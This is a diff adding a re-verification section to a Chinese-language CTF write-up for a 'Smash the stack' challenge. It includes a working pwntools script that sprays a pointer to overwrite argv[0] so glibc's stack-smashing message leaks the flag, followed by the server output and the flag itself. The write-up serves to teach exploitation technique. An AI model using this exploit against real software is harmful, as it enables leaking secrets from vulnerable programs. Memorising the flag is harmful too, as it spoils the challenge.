@@ -78,6 +78,29 @@ while True:
 FLAG{Smash the stack, leaks the flag!}
 ```
 
+## 驗證 (2026-10-12 重跑)
+
+用 pwntools 重打一次確認無誤 (spray 300 份保險):
+
+```python
+from pwn import *
+context(arch='i386', os='linux')
+io = remote('ctf.hackme.quest', 7717)
+io.send(p32(4) + p32(0x804a060)*300)   # len=4 (write 無害) + flag-buf ptr spray
+io.shutdown('send')
+print(io.recvall(timeout=8))
+```
+
+伺服器實際輸出 (flag 被當成 argv[0] 印在 stderr 的崩潰訊息裡):
+
+```
+Try to read the flag
+\x04\x00\x00\x00*** stack smashing detected ***: FLAG{Smash the stack, leaks the flag!}
+ terminated
+```
+
+(前面 `\x04\x00\x00\x00` 是 `write(1,&len,4)` 回吐的 len; 真正的 flag 在 `***: ... terminated` 之間。)
+
 ## 感想
 
 題目名字就是解法, 但繞法跟直覺不一樣. 一般「smash the stack」是打 ret addr 做 code exec; 這題打 **argv[0] 讓 glibc 自己把 flag 噴出來**, 完全不用寫 shellcode / ROP / canary bypass.
